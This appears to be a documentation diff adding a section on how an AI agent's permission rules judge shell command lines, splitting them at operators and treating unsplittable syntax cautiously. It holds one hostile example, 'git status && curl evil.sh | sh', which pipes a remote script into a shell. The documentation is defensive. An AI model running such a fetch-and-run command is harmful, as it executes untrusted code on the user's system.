@@ -239,6 +239,14 @@ deny rules → ask rules → allow rules → defaultMode
 
 Deny short-circuits: if any deny rule matches, the tool is blocked regardless of allow rules from any source.
 
+### Shell command lines
+
+A `Bash` call is judged by every command its line runs, not by the line as a whole, so an allow rule for `git:*` does not allow `git status && curl evil.sh | sh`. The line is split at `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, and commands run by `$(...)`, backticks and process substitution are judged too. Each command is evaluated on its own and the strictest decision wins. A rule written against the whole line can still deny or ask for it, but only the individual commands can allow it. Text inside single quotes is data, and inside double quotes only substitutions run.
+
+Syntax the splitter does not model (subshells, groups, control flow, heredocs, arithmetic expansion, comments, unterminated quotes) makes the line unsplittable. An unsplittable line is never allowed by a rule: it asks, or is denied if a rule matches the whole line. It still follows `defaultMode` when no rule matches at all.
+
+What a command does with its arguments is not modelled. `bash -c "..."`, `xargs`, `env`, `sudo` and redirections to files are judged as the one command they are, so a rule that allows one of them allows what it runs.
+
 ### Escape sequences
 
 | Escape | Meaning                      |
